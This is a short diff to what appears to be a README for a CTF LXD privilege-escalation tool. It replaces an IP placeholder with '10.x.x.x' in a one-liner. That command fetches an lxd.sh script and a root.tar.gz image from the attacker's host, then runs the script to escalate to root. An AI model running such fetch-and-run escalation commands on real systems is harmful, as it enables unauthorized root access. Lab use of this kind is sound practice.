@@ -11,7 +11,7 @@
  
   #### If you are doing a ctf and connected to the vpn,then type your vpn ip in commands below 
  
- > wget "http://<YOURIP>/lxd.sh" && wget "http://<YOURIP>/root.tar.gz" && chmod +x lxd.sh && ./lxd.sh root.tar.gz
+ > wget "http://10.x.x.x/lxd.sh" && wget "http://10.x.x.x/root.tar.gz" && chmod +x lxd.sh && ./lxd.sh root.tar.gz
 
   
  
